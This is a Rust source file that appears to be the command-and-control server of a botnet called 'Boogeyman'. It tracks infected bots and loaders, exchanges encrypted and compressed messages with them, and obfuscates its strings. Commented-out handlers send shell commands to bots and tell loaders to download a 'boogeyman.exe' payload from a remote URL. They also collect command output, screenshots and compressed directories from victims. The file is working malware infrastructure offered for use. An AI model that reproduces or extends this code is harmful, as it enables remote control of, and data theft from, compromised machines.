use std::collections::HashMap;
use std::collections::VecDeque;
use std::io::Cursor;
use std::net::SocketAddr;
use std::time::Duration;
use byteorder::{ ByteOrder, LittleEndian };
use chrono::Utc;
use client_vars::types::receive::BoogeymanReceivePayload;
use client_vars::types::send::BoogeymanSendPayload;
use loader_vars::types::receive::LdrRcv;
use loader_vars::types::send::LdrSnd;
use shared::constants::communication_encryption_key;
use shared::network::tor::MutexPtr;
use shared::network::tor::RwPtr;
use shared::network::tor::ServerReceive;
use shared::network::tor::SrvRcvTp;
use shared::utils::config::MibCnfg;
use shared::utils::encryption::convert_key_to_bytes;
use shared::utils::encryption::sauron_decrypt;
use shared::utils::encryption::sauron_encrypt;
use tokio::io::AsyncReadExt;
use tokio::io::AsyncWriteExt;
use anyhow::{ Context, Result };
use tokio::net::TcpListener;
use obfstr::obfstr as s;
use tokio::net::TcpStream;
use tokio::sync::Mutex;
use tokio::sync::RwLock;
use tokio::time::interval;
use tokio::time::timeout;
use std::sync::Arc;
use client_vars::types::structs::BotState;
use crate::router::client::route_client;
use crate::router::loader::route_loader;
use super::sanitization::verify_id_and_version;
use flate2::read::ZlibDecoder;
use flate2::write::ZlibEncoder;
use flate2::Compression;
use std::io::{ Read, Write, BufReader, BufWriter };

#[derive(Debug, Clone)]
pub enum BotType {
    Client,
    Loader,
}

#[derive(Debug, Clone)]
pub struct ClientInstance {
    pub join_date: String,
    pub version: u64,
    pub bot_state: BotState,
    pub console: String,
    pub stream: MutexPtr<TcpStream>,
}
#[derive(Debug, Clone)]
pub struct LoaderInstance {
    pub join_date: String,
    pub version: u64,
    pub tag: String,
    pub stream: MutexPtr<TcpStream>,
}

#[derive(Debug, Clone)]
pub struct Bot {
    pub id: String,
    pub client_instances: Vec<ClientInstance>,
    pub loader_instances: Vec<LoaderInstance>,
    pub verified: bool,
    pub join_date: String,
    pub mib_config: Option<MibCnfg>,
}

impl Bot {
    pub fn new(
        id: String,
        client_instances: Vec<ClientInstance>,
        loader_instances: Vec<LoaderInstance>,
        verified: bool,
        mib_config: Option<MibCnfg>
    ) -> Self {
        Self {
            id,
            client_instances,
            loader_instances,
            verified,
            join_date: Utc::now().to_rfc3339(),
            mib_config,
        }
    }
}
pub type BotMap = HashMap<String, Bot>;
pub type SendQueue = VecDeque<Vec<u8>>;

#[derive(Debug, Clone)]
pub struct ServerHandler {
    listener: Arc<RwLock<TcpListener>>,
    pub bot_map: Arc<RwLock<BotMap>>,
    pub loader_send_queue: HashMap<String, HashMap<u64, MutexPtr<SendQueue>>>,
    pub client_send_queue: HashMap<String, HashMap<u64, MutexPtr<SendQueue>>>,
    pub queue_tick_interval_ms: RwPtr<u64>,
}

impl ServerHandler {
    pub async fn new() -> Result<Self> {
        let addr = SocketAddr::from(([127, 0, 0, 1], 80));

        let listener = TcpListener::bind(addr).await?;

        Ok(ServerHandler {
            listener: Arc::new(RwLock::new(listener)),
            bot_map: Arc::new(RwLock::new(HashMap::new())),
            loader_send_queue: HashMap::new(),
            client_send_queue: HashMap::new(),
            queue_tick_interval_ms: Arc::new(RwLock::new(10)),
        })
    }
    pub async fn listen_for_connections(&mut self) -> Result<()> {
        loop {
            match self.listener.read().await.accept().await {
                Ok((stream, _socket_addr)) => {
                    println!("new connection!");
                    let self_clone = self.clone();
                    tokio::task::spawn(async move {
                        if let Err(e) = Self::handle_stream(&self_clone, stream).await {
                            eprintln!("Error handling client: {}", e);
                        }
                    });
                }
                Err(e) => {
                    eprintln!("Failed to accept connection: {}", e);
                }
            }
        }
    }

    async fn handle_stream(&self, stream: TcpStream) -> Result<()> {
        let stream_reference = Arc::new(Mutex::new(stream));
        let queue_stream = stream_reference.clone();
        let queue_self = self.clone();

        loop {
            println!("reading data");
            let data = match Self::read_data(stream_reference.clone()).await {
                Ok(data) => data,
                Err(error) => {
                    eprintln!("read_data error: {}", error);
                    if error.to_string().contains("Stream is closed") {
                        stream_reference.lock().await.shutdown().await?;
                        return Ok(());
                    }
                    continue;
                }
            };

            // spawn new thread
            let self_clone = self.clone();
            let stream_reference_clone = stream_reference.clone();
            tokio::task::spawn(async move {
                if let Err(e) = self_clone.handle_received_data(data, stream_reference_clone).await {
                    eprintln!("Error handling received data: {}", e);
                }
            });
        }
    }

    async fn read_data(stream_ref: MutexPtr<TcpStream>) -> Result<Vec<u8>> {
        let data_length: u32;
        loop {
            let mut stream = stream_ref.lock().await;
            // println!("stream awaited, trying read u32");
            let mut buf = [0; 4];
            match timeout(Duration::from_millis(20), stream.read_exact(&mut buf)).await {
                Ok(result) => {
                    data_length = match result {
                        Ok(_) => { LittleEndian::read_u32(&buf) }
                        Err(error) => {
                            if error.kind() == std::io::ErrorKind::UnexpectedEof {
                                // Stream is closed
                                return Err(anyhow::anyhow!("Stream is closed"));
                            } else {
                                return Err(
                                    anyhow::anyhow!(format!("Error trying to read: {}", error))
                                );
                            }
                        }
                    };
                    // break loop when we read the data
                    break;
                }
                Err(error) => {
                    // println!("timeout elapsed: {}", error);
                    //? in here we should check if the queue has something only then unlock and sleep
                    drop(stream);
                    tokio::time::sleep(Duration::from_millis(20)).await;
                }
            }
            // let data_length = match stream.read_u32_le().await {
            //     Ok(length) => length,
            //     Err(error) => {
            //         // means not our protocol message
            //         // assume its conn close
            //         println!("asd");
            //         println!("read_u32_le error: {}", error);
            //         // stream.shutdown().await?;
            //         return Err(anyhow::anyhow!(format!("Connection closed by client?: {}", error)));
            //     }
            // };
        }

        println!("compressed data len: {}", data_length);

        let mut stream = stream_ref.lock().await;

        let mut data_buf = vec![0; data_length as usize];
        stream
            .read_exact(&mut data_buf).await
            .context(s!("Failed to read exact data from stream").to_string())?;

        let mut decoder = ZlibDecoder::new(Cursor::new(data_buf));
        let mut decompressed = Vec::new();
        decoder.read_to_end(&mut decompressed).unwrap();
        Ok(decompressed)
    }

    async fn handle_received_data(
        &self,
        data: Vec<u8>,
        stream_ref: MutexPtr<TcpStream>
    ) -> Result<()> {
        // println!("data: {:#?}", data);
        let decrypted_data = sauron_decrypt(
            convert_key_to_bytes(&communication_encryption_key()),
            &data
        )?;
        let data: ServerReceive = serde_json
            ::from_slice(&decrypted_data)
            .context(s!("Failed to parse decrypted_data as ServerReceive").to_string())?;

        match data.server_receive_type {
            SrvRcvTp::Ldr => {
                let processed_data: LdrSnd = serde_json
                    ::from_slice(&data.data)
                    .context(s!("Failed to parse binary data as LoaderSendPayload").to_string())?;
                verify_id_and_version(processed_data.id.clone(), processed_data.version.clone())?;
                route_loader(self, processed_data, stream_ref).await
            }
            SrvRcvTp::Bgm => {
                let processed_data: BoogeymanSendPayload = serde_json
                    ::from_slice(&data.data)
                    .context(
                        s!("Failed to parse binary data as BoogeymanSendPayload").to_string()
                    )?;
                verify_id_and_version(processed_data.id.clone(), processed_data.version.clone())?;
                route_client(self, processed_data, stream_ref).await
            }
        }
    }

    pub async fn send_action_to_loader(
        stream_ref: MutexPtr<TcpStream>,
        action: loader_vars::types::receive::ClAct,
        params: loader_vars::types::receive::ClPrms
    ) -> Result<()> {
        let payload = LdrRcv { action, params };
        let binary_data = serde_json
            ::to_vec(&payload)
            .context(
                s!("Failed to serialize LoaderReceivePayload struct to binary data").to_string()
            )?;
        Self::encrypt_compress_and_send(stream_ref, &binary_data).await
    }
    pub async fn send_action_to_client(
        stream_ref: MutexPtr<TcpStream>,
        action: client_vars::types::receive::ClientAction,
        params: client_vars::types::receive::ClientParams
    ) -> Result<()> {
        let payload = BoogeymanReceivePayload { action, params };
        let binary_data = serde_json
            ::to_vec(&payload)
            .context(
                s!("Failed to serialize BoogeymanReceivePayload struct to binary data").to_string()
            )?;
        Self::encrypt_compress_and_send(stream_ref, &binary_data).await
    }

    async fn encrypt_compress_and_send(stream_ref: MutexPtr<TcpStream>, data: &[u8]) -> Result<()> {
        let encrypted_data = sauron_encrypt(
            convert_key_to_bytes(&communication_encryption_key()),
            data
        )?;

        let mut encoder = ZlibEncoder::new(Vec::new(), Compression::new(5));
        encoder.write_all(&encrypted_data).unwrap();

        let compressed = encoder.finish().unwrap();

        // then add u32 at start which is length

        let mut stream = stream_ref.lock().await;
        println!("stream lock awaited, compressed and encrypted len: {}", compressed.len());

        stream
            .write_all(&(compressed.len() as u32).to_le_bytes()).await
            .context(s!("Failed to write length of data to stream").to_string())?;
        stream
            .write_all(&compressed).await
            .context(s!("Failed to write the data to stream").to_string())?;
        stream.flush().await.context(s!("Failed to flush stream").to_string())?;
        Ok(())
    }

    // pub async fn client_send_queue_task(
    //     &self,
    //     stream_ref: MutexPtr<TcpStream>,
    //     bot_id: String,
    //     version: u64
    // ) -> ! {
    //     let mut interval = interval(
    //         Duration::from_millis(self.queue_tick_interval_ms.read().await.to_owned())
    //     );
    //     loop {
    //         interval.tick().await;
    //         let mut queue = self.client_send_queue
    //             .get(&bot_id)
    //             .unwrap()
    //             .get(&version)
    //             .unwrap()
    //             .lock().await;
    //         while let Some(data) = queue.pop_front() {
    //             if
    //                 let Err(error) = Self::encrypt_compress_and_send(
    //                     stream_ref.clone(),
    //                     &data
    //                 ).await
    //             {
    //             }
    //         }
    //     }
    // }
    // pub async fn loader_send_queue_task(
    //     &self,
    //     stream_ref: MutexPtr<TcpStream>,
    //     bot_id: String,
    //     version: u64
    // ) -> ! {
    //     let mut interval = interval(
    //         Duration::from_millis(self.queue_tick_interval_ms.read().await.to_owned())
    //     );
    //     loop {
    //         interval.tick().await;
    //         let mut queue = self.loader_send_queue
    //             .get(&bot_id)
    //             .unwrap()
    //             .get(&version)
    //             .unwrap()
    //             .lock().await;
    //         while let Some(data) = queue.pop_front() {
    //             if
    //                 let Err(error) = Self::encrypt_compress_and_send(
    //                     stream_ref.clone(),
    //                     &data
    //                 ).await
    //             {
    //             }
    //         }
    //     }
    // }
    // pub async fn add_to_send_queue(
    //     &self,
    //     bot_type: BotType,
    //     bot_id: String,
    //     version: u64,
    //     data: Vec<u8>
    // ) -> Result<()> {
    //     match bot_type {
    //         BotType::Client => {
    //             if let Some(queue) = self.client_send_queue.get(&bot_id) {
    //                 if let Some(queue) = queue.get(&version) {
    //                     queue.lock().await.push_back(data);
    //                 } else {
    //                     eprintln!("ERROR ADDING TO SEND Client QUEUE - BOT VERSION DONT EXIST: {}", version);
    //                 }
    //             } else {
    //                 eprintln!("ERROR ADDING TO SEND Client QUEUE - BOT ID DONT EXIST: {}", bot_id);
    //             }
    //         }
    //         BotType::Loader => {
    //             if let Some(queue) = self.loader_send_queue.get(&bot_id) {
    //                 if let Some(queue) = queue.get(&version) {
    //                     queue.lock().await.push_back(data);
    //                 } else {
    //                     eprintln!("ERROR ADDING TO SEND Loader QUEUE - BOT VERSION DONT EXIST: {}", version);
    //                 }
    //             } else {
    //                 eprintln!("ERROR ADDING TO SEND Loader QUEUE - BOT ID DONT EXIST: {}", bot_id);
    //             }
    //         }
    //     }
    //     Ok(())
    // }
}

// pub async fn route_boogeyman(
//     stream: &mut TcpStream,
//     locked_bot_map: &BoogeymanBotMap,
//     received: BoogeymanServerReceive
// ) -> Result<()> {
//     let mut bot_map = locked_bot_map.write().unwrap();

//     match received.action {
//         BoogeymanActionForServer::Init => {
//             // init or fully reset if exist the info data
//             if let BoogeymanServerParams::Init(bot_info) = received.params {
//                 //? THIS DATA WILLLLLLLLLLLLLLLL BE MALICIOUS
//                 // PURIFY AND SANITIZE ALL
//                 let locked_version_map = bot_map
//                     .entry(received.id.clone())
//                     .or_insert(Arc::new(RwLock::new(HashMap::new())));
//                 let mut version_map = locked_version_map.write().unwrap();
//                 let current_time: String = Utc::now().to_string();

//                 version_map.insert(received.version, BoogeymanBot {
//                     bot_info,
//                     id: received.id,
//                     join_date: current_time,
//                     console_out: String::new(),
//                     console_err: String::new(),
//                 });

//                 drop(version_map);
//                 println!(
//                     "Boogeyman Init Arrived, made new entry, full boogeyman version_botmap: {:#?}",
//                     bot_map
//                 );
//                 let out: ClientReceive = ClientReceive::Boogeyman(BoogeymanClientReceive {
//                     action: BoogeymanActionForClient::RunCommand,
//                     data: BoogeymanClientParams::RunCommand(RunCommandParams {
//                         command: "echo TEST MODE".to_string(),
//                     }),
//                 });
//                 let data = process_sending(out)?;
//                 Self::send_data_raw(stream, &data).await?;
//             } else {
//                 println!("data not ServerData::BotInfo: {:#?}", received.params);
//             }
//         }
//         BoogeymanActionForServer::CommandOutput => {
//             if let BoogeymanServerParams::CommandOutput(params) = received.params {
//                 // PURIFY AND SANITIZE ALL
//                 let locked_version_map = bot_map
//                     .entry(received.id.clone())
//                     .or_insert(Arc::new(RwLock::new(HashMap::new())));
//                 let mut version_map = locked_version_map.write().unwrap();
//                 // Check if version exists, update instead of insert
//                 if let Some(bot) = version_map.get_mut(&received.version) {
//                     if let Some(output) = &params.output {
//                         bot.console_out.push_str(&format!("\n{}", output));
//                     }
//                     if let Some(error) = &params.error {
//                         bot.console_err.push_str(&format!("\n{}", error));
//                     }
//                 }

//                 drop(version_map);
//             } else {
//                 println!("data not CommandOutput: {:#?}", received.params);
//             }
//         }
//         BoogeymanActionForServer::Logs => {}
//         BoogeymanActionForServer::CompressedDir => {}
//         BoogeymanActionForServer::Thumbnail => {
//             if let BoogeymanServerParams::Thumbnail(params) = received.params {
//                 println!("Received Thumbnail of len: {}", params.thumbnail.len());
//             } else {
//                 println!("data not Thumbnail: {:#?}", received.params);
//             }
//         }
//         BoogeymanActionForServer::RealTimeData => {
//             if let BoogeymanServerParams::RealTimeData(params) = received.params {
//                 let locked_version_map = bot_map
//                     .entry(received.id.clone())
//                     .or_insert(Arc::new(RwLock::new(HashMap::new())));
//                 let mut version_map = locked_version_map.write().unwrap();
//                 // Check if version exists, update instead of insert
//                 if let Some(bot) = version_map.get_mut(&received.version) {
//                     bot.bot_info.real_time_info = params.real_time_info;
//                 }

//                 drop(version_map);
//             } else {
//                 println!("data not RealTimeData: {:#?}", received.params);
//             }
//         }
//     }
//     drop(bot_map);
//     Ok(())
// }
// pub async fn route_engineer(
//     stream: &mut TcpStream,
//     locked_bot_map: &EngineerBotMap,
//     received: EngineerServerReceive
// ) -> Result<()> {
//     let mut bot_map = locked_bot_map.write().unwrap();

//     match received.action {
//         EngineerActionForServer::InitEng => {
//             if let EngineerServerParams::InitEng(_data) = received.params {
//                 let locked_version_map = bot_map
//                     .entry(received.id.clone())
//                     .or_insert(Arc::new(RwLock::new(HashMap::new())));
//                 let mut version_map = locked_version_map.write().unwrap();
//                 let current_time: String = Utc::now().to_string();
//                 version_map.insert(received.version, EngineerBot {
//                     id: received.id.clone(),
//                     join_date: current_time,
//                 });
//                 drop(version_map);

//                 println!(
//                     "Engineer InitEng Arrived, made new entry, full engineer botmap: {:#?}",
//                     bot_map
//                 );

//                 // let bgm_bytes = match get_boogeyman_bytes() {
//                 //     Ok(bytes) => Some(bytes),
//                 //     Err(error) => {
//                 //         eprintln!("ERROR READIND BOOGEYMAN BTYES: {}", error);
//                 //         None
//                 //     }
//                 // };
//                 // now we gotta send the runinit
//                 let client_receive: ClientReceive = ClientReceive::Engineer(
//                     EngineerClientReceive {
//                         action: EngineerActionForClient::RunConfig,
//                         data: EngineerClientParams::RunConfig(RunConfigParams {
//                             enbl: true, // enabled - if disabled not even run
//                             bgmn_bytes: None, // boogeyman bytes
//                             bgmn: Some(
//                                 "https://gitlab.com/dorkpls/plsnodork/-/raw/main/boogeyman.exe".to_string()
//                             ), // boogeyman url download
//                             bgm_ver: 1, //
//                             updt_bytes: None, // self update bytes
//                             updt: None, // self update url download
//                             vrs: 1, // self version
//                         }),
//                     }
//                 );

//                 let data = process_sending(client_receive).unwrap();

//                 // let result = Self::send_data_raw(stream, &data).await;
//                 // if let Err(e) = result {
//                 //     // Handle the error
//                 //     println!("Error sending data: {:?}", e);
//                 // }

//                 Self::send_data_raw(stream, &data).await.context(
//                     s!("Failed to send_data_raw").to_string()
//                 )?;
//             } else {
//                 println!("data not EngineerServerParams::InitEng: {:#?}", received.params);
//             }
//         }
//     }
//     drop(bot_map);
//     Ok(())
